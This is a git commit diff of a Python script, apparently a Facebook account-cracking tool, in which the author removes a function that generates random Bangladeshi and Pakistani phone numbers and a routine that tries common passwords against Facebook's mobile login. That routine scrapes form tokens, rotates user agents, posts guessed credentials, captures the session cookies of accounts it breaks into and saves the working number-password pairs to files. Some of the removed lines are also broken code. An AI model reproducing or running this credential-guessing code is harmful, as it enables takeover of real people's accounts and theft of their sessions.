95f550f8c97d7df4e89eba55cbe42c4f3b567aa2
mdtasin123 <129798134+mdtasin123@users.noreply.github.com>
2023-05-20 13:43:36 +0530

    Add files via upload

--- momomah.py
+++ momomah.py
@@ -902,8 +902,6 @@ def gmail():
 #----------------- Random METHOD Number -------------------------------------
 				if mthd in ['1','01']:
 					AXI.submit(rcrack1,ids,passlist)
-				mthd in ['3','03']:
-					AXI.submit(uid,pwx,tl):
 				else:
 					AXI.submit(rcrack,ids,passlist)
 		print('\033[1;91m')
@@ -1123,112 +1121,7 @@ def rcrack(ids,passlist):
 	except:
 		pass
 		
-#----------------- Random Nolmal METHOD  -------------------------------------
 
-def i():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[38;5;46--------------------------------------------')
-    print('\x1b[1;93mBANGLADESH & PAKISTAN RANDOM NUMBER CLONED')
-    print('\033[38;5;46--------------------------------------------')
-    print('\033[97;1mᗙ \033[92;1m\033[97;1m\033[38;5;46mPK CODE    \033[38;5;196m:\x1b[1;95m 92301 92302 92303 92305 ')
-    print('\033[38;5;46--------------------------------------------')
-    print('\033[97;1mᗙ \033[92;1m\033[97;1m\033[38;5;46mBD CODE    \033[38;5;196m:\x1b[1;95m 88016 88017 88018 88019 ')
-    print('\033[38;5;46--------------------------------------------')
-    code = input('\033[38;5;196mINPUT CODE \033[1;97m: ')
-    print("")
-    os.system('clear')
-    print(logo)
-    print("           \033[1;97m[\033[1;33mGS-XD \--👽--/\033[1;97m]")
-    print("\033[38;5;46--------------------------------------------")
-    print("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[1;35m10000\033[1;97m , \033[1;34m20000\033[1;97m , \033[1;32m30000")
-    print("\033[38;5;46--------------------------------------------")
-    limit = int(input("\033[97;1m[\033[92;1m?\033[97;1m] \033[1;97mCRACK ID LIMIT \033[38;5;196m: \033[1;32m"))
-    
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with ThreadPool(max_workers=50) as Riyad:
-        clear()
-        tl = str(len(user))
-        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mAGENTS    \033[38;5;196m: \033[1;32m'+str(len(ugen)))
-        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m: \033[1;32m'+code)
-        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mCRACK ID  \033[38;5;196m: \033[1;32m'+tl)
-        print('\033[38;5;46--------------------------------------------')
-        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE")
-        print('\033[38;5;46--------------------------------------------')
-        for love in user:
-            pwx = [love,'bangladesh','i love you','121234','0987654','Bangladesh']
-            uid = uid+love
-            Riyad.submit(rcrack,uid,pwx,tl)
-    print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
- 
-def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://p.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-            'method':'GET',
-            'scheme':'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"11.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print('\033[38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033[38;5;46m'+coki+ ' ')                
-                open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print('\033[38;5;196m〔᚛GS XD-CP〔᚛᚜〕 ' +uid+ '|' +ps+ '  \33[0;97m')
-                open('/sdcard/GS XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write('\r\33[1;93m[\33〔᚛GS XD-OK\033[0m/%s\33[1;93m᚜〕\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
-        sys.stdout.flush()
-    except:
-        pass
 
 #----------------- Mobile File METHOD  -------------------------------------
 		
